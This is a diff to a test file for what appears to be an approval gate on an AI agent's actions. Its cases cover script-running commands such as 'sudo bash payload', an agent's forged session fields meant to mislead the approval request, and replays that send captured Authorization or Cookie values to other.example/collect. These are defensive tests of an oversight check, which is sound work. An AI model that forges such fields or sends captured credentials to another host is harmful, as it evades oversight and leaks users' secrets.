@@ -99,6 +99,8 @@ def _settings(**overrides: Any) -> ActionApprovalSettings:
         ("X=1 sudo -u app bash x.sh", "/w", ["/w/x.sh"]),
         ("cat x.sh | bash", "/w", ["/w/x.sh"]),
         ("timeout 5 nohup ./go", "/w", ["/w/go"]),
+        ("sudo bash payload", "/w", ["/w/payload"]),
+        ("X=1 env -i timeout 5 python3 run", "/w", ["/w/run"]),
         ("bash -lc 'source ./e.sh && id'", "/w", ["/w/e.sh"]),
         ("curl -s https://a.example/c.js > out.json", "/w", []),
         ("python3 'unterminated", ".", []),
@@ -707,9 +709,18 @@ async def test_input_typed_into_a_running_program_is_checked_with_that_program()
         assert requests[-1]["session_command"] == "psql -f purge.sql"
         requests.pop()
         requests.pop()
-        # Input for a session this agent did not open is still checked, on its own.
-        await write.on_invoke_tool(ctx, json.dumps({"session_id": 9, "chars": "ls\n"}))
+        # Input for a session this agent did not open is still checked, on its own, and
+        # the agent cannot say what that session runs.
+        forged = {"session_id": 9, "chars": "ls\n", "session_command": "echo", "earlier_input": "x"}
+        await write.on_invoke_tool(ctx, json.dumps(forged))
         assert "session_command" not in requests[3]
+        assert "earlier_input" not in requests[3]
+        # Every spelling the tool accepts for a session finds that session's record.
+        for spelling in ("07", " 7", 7.0):
+            results = iter(["ok"])
+            await write.on_invoke_tool(ctx, json.dumps({"session_id": spelling, "chars": "q"}))
+            assert requests[-1]["session_command"] == "psql -f purge.sql"
+            assert requests[-1]["session_id"] == 7
 
 
 def test_the_approval_text_shows_characters_that_reorder_or_hide_it() -> None:
@@ -764,6 +775,40 @@ def _replay_context(
             {"url": "https://other.example/collect", "cookies": {"extra": "1"}},
             ["Authorization", "Cookie"],
         ),
+        # A captured secret counts wherever it reappears, however its header was rewritten.
+        (
+            {
+                "url": "https://other.example/collect",
+                "headers": {"Authorization": "bearer fixture-value", "Cookie": "a=b"},
+            },
+            ["Authorization"],
+        ),
+        (
+            {
+                "url": "https://other.example/collect",
+                "headers": {
+                    "Authorization": "Basic own",
+                    "Cookie": "a=b",
+                    "X-Relay": "fixture-cookie",
+                },
+            },
+            ["Cookie"],
+        ),
+        (
+            {
+                "url": "https://other.example/collect",
+                "headers": {"Authorization": "Basic own", "Cookie": "a=b"},
+                "body": "t=fixture-value",
+            },
+            ["Authorization"],
+        ),
+        (
+            {
+                "url": "https://other.example/collect",
+                "headers": {"Authorization": "Basic own", "Cookie": "a=b"},
+            },
+            None,
+        ),
         ({"url": "https://example.com/users/124"}, None),
         ({}, None),
     ],
@@ -798,7 +843,8 @@ async def test_replay_check_is_told_when_captured_credentials_go_to_another_host
             f"Sends the {', '.join(carried)} captured from example.com to other.example"
             in (events[0]["summary"])
         )
-        assert "fixture-value" not in json.dumps(requests[0])
+        if "body" not in modifications:
+            assert "fixture-value" not in json.dumps(requests[0])
 
 
 @pytest.mark.asyncio
